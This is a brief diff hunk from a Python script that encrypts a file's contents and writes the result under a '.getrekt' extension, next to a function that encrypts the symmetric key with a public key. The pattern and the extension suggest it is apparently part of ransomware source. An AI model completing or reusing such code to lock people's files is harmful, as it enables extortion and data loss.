@@ -16,7 +16,7 @@ def encrypt_file(file_path, symmetric_key):
     encryptor = cipher.encryptor()
     ciphertext = encryptor.update(plaintext) + encryptor.finalize()
 
-    with open(file_path + '.getRekt', 'wb') as encrypted_file:
+    with open(file_path + '.getrekt', 'wb') as encrypted_file:
         encrypted_file.write(ciphertext)
 
 def encrypt_symmetric_key(symmetric_key, public_key_path):
